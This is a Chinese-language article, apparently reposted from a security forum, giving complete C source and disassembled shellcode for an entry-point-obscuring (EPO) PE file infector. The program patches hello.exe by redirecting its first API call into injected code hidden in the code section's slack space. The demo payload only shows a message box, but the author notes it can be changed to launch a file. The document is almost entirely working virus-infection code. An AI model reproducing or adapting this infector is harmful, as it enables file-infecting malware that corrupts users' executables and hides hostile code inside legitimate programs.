
# 用 C 实现简单的 EPO

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-712.htm`](https://www.pediy.com/kssd/pediy08/pediy8-712.htm)

//:::从代码节开始搜索,替换第一个发现的 call api 的指令
//:::把目标代码插入代码节的尾部
//:::代码仅供演示之用,没有做过多的错误处理
//:::感染当前 hello.exe,插入一段弹出对话框代码（当然你可以修改成启动文件的代码，嘿嘿）
//:::coded by robrinh00d
//:::robinh00d_at_163.com
//:::编译:cl epo.c

/*
要插入的反汇编代码 thunk code:

00401006   .  60                 PUSHAD
00401007   .  9C                 PUSHFD
00401008   .  E8 00000000        CALL msg.0040100D
0040100D   $  5B                 POP EBX
0040100E   .  81EB 0D104000      SUB EBX,msg.0040100D
00401014   .  6A 00              PUSH 0
00401016   .  8D83 30104000      LEA EAX,DWORD PTR DS:[EBX+401030]
0040101C   .  50                 PUSH EAX
0040101D   .  50                 PUSH EAX
0040101E   .  6A 00              PUSH 0
00401020   .  B8 78563412        MOV EAX,12345678             ;这里感染前会被替换成正确的 MessageBoxA 的地址
00401025   .  FFD0               CALL EAX
00401027   .  9D                 POPFD
00401028   .  61                 POPAD
00401029   .  FF25 3A104000      JMP DWORD PTR DS:[40103A]    ;跳到 API
0040102F      90                 NOP
00401030   .  72 6F 62 69 6E 68 3>ASCII "robinh00d",0

*/

```c
#include <windows.h>

#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"user32.lib")

char szHostFile[] = ".\\hello.exe" ;

PIMAGE_DOS_HEADER pImageDosHeader ;
PIMAGE_NT_HEADERS pImageNtHeaders ;
PIMAGE_SECTION_HEADER pImageSectionHeader ;

unsigned char thunkcode[] = "\x60\x9c\xe8\x00\x00\x00\x00\x5b"
                            "\x81\xeb\x0d\x10\x40\x00\x6a\x00"
                            "\x8d\x83\x30\x10\x40\x00\x50\x50"
                            "\x6a\x00\xb8\x78\x56\x34\x12\xff"
                            "\xd0\x9d\x61\xff\x25\x3a\x10\x40"
                            "\x00\x90\x72\x6f\x62\x69\x6e\x68"
                            "\x30\x30\x64\x00" ;

int main()
{
    HANDLE hFile ;
    HANDLE hMap ;
    LPVOID pMapping ;
    DWORD dwGapSize ;
    unsigned char *pGapEntry ;
    int i ;
    PROC MsgBox ;
    DWORD OldEntry ;
    int x = 0x18 ;
    int vir_len ;
    unsigned char *pSearch ;
    DWORD *dwCallNextAddr ;
    DWORD *dwCallDataOffset ;
    DWORD *dwCallDataAddr ;
    DWORD dwCallData ;
    DWORD dwCodeDistance ;
    DWORD *dwJmpAddr ;
    DWORD dwJmpData ;
    DWORD dwJmpVA ;

    //:::
    hFile = CreateFile(szHostFile,
                      FILE_ALL_ACCESS,
                      FILE_SHARE_READ,
                      NULL,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      NULL) ;

    if (hFile==-1)
    {
        printf("Open host file failed!\n") ;
        return -1 ;
    }

    hMap = CreateFileMapping(hFile,
                            NULL,
                            PAGE_READWRITE,
                            0,
                            0,
                            NULL) ;

    if (!hMap)
    {
        printf("Create file mapping falied!\n") ;
        return -1 ;
    }

    pMapping = MapViewOfFile(hMap,
                        FILE_MAP_ALL_ACCESS,
                        0,
                        0,
                        0) ;

    if (!pMapping)
    {
        printf("Map view of file failed!\n") ;
        return -1 ;
    }

    //::::::打开目标宿主文件,先检测文件是否 PE 格式,定位到代码的末尾
    pImageDosHeader = (PIMAGE_DOS_HEADER)pMapping ;

    if (pImageDosHeader->e_magic==IMAGE_DOS_SIGNATURE)
    {
        pImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)pMapping+pImageDosHeader->e_lfanew) ;

        if (pImageNtHeaders->Signature==IMAGE_NT_SIGNATURE)
        {
            //:::是合法的 PE 文件
            //:::定位到节表头
            pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pMapping+
                                                         pImageDosHeader->e_lfanew+
                                                         sizeof(IMAGE_NT_HEADERS)) ;

            //:::计算第一个节的空隙大小
            dwGapSize = pImageSectionHeader->SizeOfRawData - pImageSectionHeader->Misc.VirtualSize ;

            //:::如果代码缝隙小于 thunk code 的大小则感染失败
            if (sizeof(thunkcode)>dwGapSize)
            {
                printf("no more space to fill!\n") ;
                goto Close ;
            }

            //:::定位到代码末尾
            pGapEntry = (unsigned char *)(pImageSectionHeader->PointerToRawData+
                                         (DWORD)pMapping+
                                         pImageSectionHeader->Misc.VirtualSize) ;

            OldEntry = pImageNtHeaders->OptionalHeader.ImageBase+
                      pImageNtHeaders->OptionalHeader.AddressOfEntryPoint ;

            MsgBox = (PROC)GetProcAddress(LoadLibrary("user32.dll"),"MessageBoxA") ;

            //修改为当前系统的 MessageBoxA 地址
            for (i=3;i>=0;i--)
            {
                thunkcode[i+27] = ((unsigned int)MsgBox>>x)&0xff ;
                x -= 8 ;
            }

            x = 24 ;
            vir_len = (int)pImageSectionHeader->Misc.VirtualSize ;
            pSearch = (unsigned char *)(pImageSectionHeader->PointerToRawData+
                (DWORD)pMapping) ;

            //:::搜索 call 指令(0xe8)
            for (i=0;i<vir_len;i++)
            {
                if (pSearch[i]==0xe8)
                {
                    //:::call 指令操作数地址
                    dwCallDataAddr = (DWORD *)(&pSearch[i]+1) ;

                    //:::call 下条指令地址
                    dwCallNextAddr=(DWORD *)(&pSearch[i]+5) ;

                    //:::jmp 指令地址
                    dwJmpAddr = (DWORD *)(*dwCallDataAddr+ (DWORD)dwCallNextAddr) ;

                    //:::Jmp 指令在内存的虚拟地址 VA
                    dwJmpVA = (DWORD)dwJmpAddr-
                              ((DWORD)pMapping+pImageSectionHeader->PointerToRawData)+
                              pImageNtHeaders->OptionalHeader.ImageBase+
                              pImageNtHeaders->OptionalHeader.AddressOfEntryPoint ;

                    //:::取 jmp 操作数,返回的时候使用
                    dwJmpData = *((DWORD *)((unsigned char *)dwJmpAddr+2)) ;

                    if ((*dwJmpAddr&0xffff)==0x25ff)
                    {
                        //:::修改 call 操作数
                        dwCodeDistance = (DWORD)pGapEntry - (DWORD)dwCallNextAddr ;
                        *dwCallDataAddr = dwCodeDistance ;

                        //:::原 jmp 里的操作数,替换到 thunk code 的末尾
                        for (i=3;i>=0;i--)
                        {
                            thunkcode[i+37] = ((unsigned int)dwJmpData>>x)&0xff ;
                            x -= 8 ;
                        }

                        //把 thunk code 写入目标宿主程序
                        for (i=0;i<sizeof(thunkcode);i++)
                        {
                            pGapEntry[i] = thunkcode[i] ;
                        }

                        break ;
                    }
                }
            }
        }
    }
    else
    {
        printf("Invalid file format!\n") ;
    }

    Close:
    UnmapViewOfFile(pMapping) ;
    CloseHandle(hMap) ;
    CloseHandle(hFile) ;
    return 0 ;
}
```

`4dd466d0e1e0cc123afbe504da2462ca`
